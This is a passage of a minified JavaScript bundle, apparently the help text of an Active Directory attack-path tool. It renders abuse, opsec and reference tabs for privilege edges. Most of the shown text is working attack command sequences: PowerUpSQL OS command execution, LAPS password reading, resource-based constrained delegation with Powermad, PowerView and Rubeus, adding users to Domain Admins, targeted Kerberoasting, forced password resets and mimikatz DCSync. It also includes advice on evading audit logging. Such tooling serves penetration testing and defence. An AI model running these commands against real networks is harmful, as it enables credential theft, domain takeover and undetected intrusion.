Example"}),e.jsx(t,{component:"pre",children:'Invoke-SQLOSOle -Verbose -Command "Whoami" -Instance sqlserver\\instance'}),e.jsx(t,{variant:"body2",children:"CLR Execution Example"}),e.jsx(t,{component:"pre",children:'Invoke-SQLOSCLR -Verbose -Command "Whoami" -Instance sqlserver\\instance'}),e.jsx(t,{variant:"body2",children:"Custom Extended Procedure Execution Example:"}),e.jsx(t,{variant:"body2",children:"1. Create a custom extended stored procedure."}),e.jsx(t,{component:"pre",children:'Create-SQLFileXpDll -Verbose -OutFile c:\\temp\\test.dll -Command "echo test > c:\\temp\\test.txt" -ExportName xp_test'}),e.jsx(t,{variant:"body2",children:"2. Host the test.dll on a share readable by the SQL Server service account."}),e.jsx(t,{component:"pre",children:`Get-SQLQuery -Verbose -Query "sp_addextendedproc 'xp_test', '\\\\yourserver\\yourshare\\myxp.dll'" -Instance sqlserver\\instance`}),e.jsx(t,{variant:"body2",children:"3. Run extended stored procedure"}),e.jsx(t,{component:"pre",children:'Get-SQLQuery -Verbose -Query "xp_test" -Instance sqlserver\\instance'}),e.jsx(t,{variant:"body2",children:"4. Remove extended stored procedure."}),e.jsx(t,{component:"pre",children:`Get-SQLQuery -Verbose -Query "sp_dropextendedproc 'xp_test'" -Instance sqlserver\\instance`}),e.jsx(t,{variant:"body2",children:"Author: Scott Sutherland"})]}),bd=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Prior to executing operating system commands through SQL Server, review the audit configuration and choose a command execution method that is not being monitored."}),e.jsx(t,{variant:"body2",children:"View audits:"}),e.jsx(t,{component:"pre",children:"SELECT * FROM sys.dm_server_audit_status"}),e.jsx(t,{variant:"body2",children:"View server specifications:"}),e.jsx(t,{component:"pre",children:`SELECT audit_id, 
a.name as audit_name, 
s.name as server_specification_name, 
d.audit_action_name, 
s.is_state_enabled, 
d.is_group, 
d.audit_action_id, 
s.create_date, 
s.modify_date 
FROM sys.server_audits AS a 
JOIN sys.server_audit_specifications AS s 
ON a.audit_guid = s.audit_guid 
JOIN sys.server_audit_specification_details AS d 
ON s.server_specification_id = d.server_specification_id`}),e.jsx(t,{variant:"body2",children:"View database specifications:"}),e.jsx(t,{component:"pre",children:`SELECT a.audit_id, 
a.name as audit_name, 
s.name as database_specification_name, 
d.audit_action_name, 
d.major_id,
OBJECT_NAME(d.major_id) as object,
s.is_state_enabled, 
d.is_group, s.create_date, 
s.modify_date, 
d.audited_result 
FROM sys.server_audits AS a 
JOIN sys.database_audit_specifications AS s 
ON a.audit_guid = s.audit_guid 
JOIN sys.database_audit_specification_details AS d 
ON s.database_specification_id = d.database_specification_id`}),e.jsx(t,{variant:"body2",children:"If server audit specifications are configured on the SQL Server, event ID 15457 logs may be created in the Windows Application log when SQL Server level configurations are changed to facilitate OS command execution."}),e.jsx(t,{variant:"body2",children:"If database audit specifications are configured on the SQL Server, event ID 33205 logs may be created in the Windows Application log when Agent and database level configuration changes are made."}),e.jsxs(t,{variant:"body2",children:["A summary of the what will show up in the logs, along with the TSQL queries for viewing and configuring audit configurations can be found at",e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Audit%20Command%20Execution%20Template.sql",children:"https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Audit%20Command%20Execution%20Template.sql"}),"."]}),e.jsx(t,{variant:"body2",children:"Author: Scott Sutherland"})]}),gd=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/NetSPI/PowerUpSQL/wiki",children:"https://github.com/NetSPI/PowerUpSQL/wiki"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.slideshare.net/nullbind/powerupsql-2018-blackhat-usa-arsenal-presentation",children:"https://www.slideshare.net/nullbind/powerupsql-2018-blackhat-usa-arsenal-presentation"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#sqlserver",children:"https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#sqlserver"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-2017",children:"https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-2017"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/",children:"https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/"})]}),yd={general:ud,abuse:md,opsec:bd,references:gd},fd=({sourceName:n,sourceType:r,targetName:a,targetType:s})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," the ability to synchronize the password set by Local Administrator Password Solution (LAPS) on the computer ",a,"."]}),e.jsxs(t,{variant:"body2",children:["The local administrator password for a computer managed by LAPS is stored in the confidential and Read-Only Domain Controller (RODC) filtered LDAP attribute"," ",e.jsx(t,{component:"pre",children:"ms-mcs-AdmPwd"}),"."]})]}),wd=({sourceName:n,sourceType:r,targetName:a,targetType:s})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["To abuse this privilege with DirSync, first import DirSync into your agent session or into a PowerShell instance at the console. You must authenticate to the Domain Controller as"," ",k(r,n),". Then, execute the"," ",e.jsx(t,{component:"pre",children:"Sync-LAPS"})," function:"]}),e.jsxs(t,{component:"pre",children:['Sync-LAPS -LDAPFilter "(samaccountname=',a,')"']}),e.jsxs(t,{variant:"body2",children:["You can target a specific domain controller using the ",e.jsx(t,{component:"pre",children:"-Server"})," ","parameter."]})]}),xd=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"Executing the attack will generate a 4662 (An operation was performed on an object) event at the domain controller if an appropriate SACL is in place on the target object."})}),jd=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/simondotsh/DirSync",children:"https://github.com/simondotsh/DirSync"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://simondotsh.com/infosec/2022/07/11/dirsync.html",children:"https://simondotsh.com/infosec/2022/07/11/dirsync.html"})]}),vd={general:fd,abuse:wd,opsec:xd,references:jd},Ad=({sourceName:n,targetName:r})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The domain ",n," is trusted by the domain ",r,"."]}),e.jsx(t,{variant:"body2",children:"This edge is informational and does not indicate any attacks, only that a trust exists."})]}),Sd=()=>e.jsx(t,{variant:"body2",children:"There is no abuse associated with this edge."}),kd=()=>e.jsx(t,{variant:"body2",children:"There is no opsec associated with this edge"}),Td=()=>e.jsx(t,{children:"No Information Available"}),Pd={general:Ad,abuse:Sd,opsec:kd,references:Td},Cd=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," has write rights on all properties in the User Account Restrictions property set. Having write access to this property set translates to the ability to modify several attributes on computer ",a,", among which the msDS-AllowedToActOnBehalfOfOtherIdentity attribute is the most interesting. The other attributes in this set are listed in Dirk-jan's blog on this topic (see references)."]}),e.jsx(t,{variant:"body2",children:"The ability to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property allows an attacker to abuse resource-based constrained delegation to compromise the remote computer system. This property is a binary DACL that controls what security principals can pretend to be any domain user to the particular computer object."}),e.jsx(t,{variant:"body2",children:'If the msDS-AllowedToActOnBehalfOfOtherIdentity DACL is set to allow an attack-controller account, the attacker can use said account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket "as" this user.'}),e.jsx(t,{variant:"body2",children:'One caveat is that impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service principal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.'})]}),Dd=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project. First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:`"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"`}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"'$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid'"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\\n' + '$SDBytes = New-Object byte[] ($SD.BinaryLength)\\n' + '$SD.GetBinaryForm($SDBytes, 0)'`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:`"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"`}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"'Rubeus.exe hash /password:Summer2018!'"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'"})]}),Rd=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),e.jsx(t,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),e.jsx(t,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),e.jsx(t,{variant:"body2",children:`And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.`}),e.jsx(t,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),e.jsx(t,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."})]}),Od=()=>e.jsx(t,{variant:"body2",children:"To execute this attack, the Rubeus C# assembly needs to be executed on some system with the ability to send/receive traffic in the domain. Modification of the *msDS-AllowedToActOnBehalfOfOtherIdentity* property against the target also must occur, whether through PowerShell or another method. The property should be cleared (or reset to its original value) after attack execution in order to prevent easy detection."}),$d=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://dirkjanm.io/abusing-forgotten-permissions-on-precreated-computer-objects-in-active-directory/",children:"https://dirkjanm.io/abusing-forgotten-permissions-on-precreated-computer-objects-in-active-directory/"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl",children:"https://www.thehacker.recipes/ad/movement/dacl"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota",children:"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"})]}),Id={general:Cd,windowsAbuse:Dd,linuxAbuse:Rd,opsec:Od,references:$d},Md=({sourceName:n,sourceType:r,targetName:a,targetType:s})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," permissions to modify the DACL (Discretionary Access Control List) on the ",I(s)," ",a]}),e.jsx(t,{variant:"body2",children:"With write access to the target object's DACL, you can grant yourself any privilege you want on the object."})]}),Gd=({sourceName:n,sourceType:r,targetName:a,targetType:s,targetId:i,haslaps:c})=>{switch(s){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a group object, you may grant yourself the AddMember privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:'Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Rights WriteMembers'}),e.jsx(t,{variant:"body2",children:"You can now add members to the group using the net binary or PowerView's Add-DomainGroupMember."}),e.jsx(t,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),e.jsx(t,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"}),e.jsx(t,{variant:"body2",children:"Cleanup for this can be done using Remove-DomainObjectAcl"}),e.jsx(t,{component:"pre",children:'Remove-DomainObjectAcl -Credential $cred -TargetIdentity "Domain Admins" -Rights WriteMembers'})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a user object, you may grant yourself the GenericAll privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All"}),e.jsx(t,{variant:"body1",children:" Targeted Kerberoast "}),e.jsx(t,{variant:"body2",children:"A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"}),e.jsx(t,{variant:"body2",children:"After running this, you can use Get-DomainSPNTicket as follows:"}),e.jsx(t,{component:"pre",children:"Get-DomainSPNTicket -Credential $Cred harmj0y | fl"}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:"}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname"}),e.jsx(t,{variant:"body1",children:"Force Change Password"}),e.jsx(t,{variant:"body2",children:"There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab)."}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then create a secure string object for the password you want to set on the target user:"}),e.jsx(t,{component:"pre",children:"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}),e.jsxs(t,{variant:"body2",children:["Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed with Remove-DomainObjectAcl:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All"})]});case"Computer":return c?e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a computer object, you may grant yourself the GenericAll privilege."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"}),e.jsx(t,{variant:"body2",children:"Once you have granted yourself this privilege, you may read the ms-Ads-AdmPwd attribute on the computer object in LDAP which contains the local administrator password."}),e.jsx(t,{variant:"body2",children:"Alternatively, you can execute a resource based constrained delegation attack."}),e.jsx(t,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"}),e.jsx(t,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"})]}):e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a computer object, you may grant yourself the GenericAll privilege."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"}),e.jsx(t,{variant:"body2",children:"Once you have granted yourself this privilege, you can execute a resource based constrained delegation attack."}),e.jsx(t,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"}),e.jsx(t,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a domain object, you may grant yourself DCSync privileges."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync"}),e.jsx(t,{variant:"body2",children:"Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain"}),e.jsx(t,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:Administrator"}),e.jsx(t,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync"}),e.jsx(t,{variant:"body2",children:"You can also abuse this without using Windows-based tooling if you are operating from a Linux host. DCSync.py from n00py will let you authenticate with either a plaintext password, NT hash, or kerberos ticket:"}),e.jsx(t,{variant:"body2",children:'To grant the "n00py" user DCSync privileges, authenticating as the user "n00py" with the password "Password123":'}),e.jsx(t,{component:"pre",children:"./dcsync.py -dc dc01.n00py.local -t 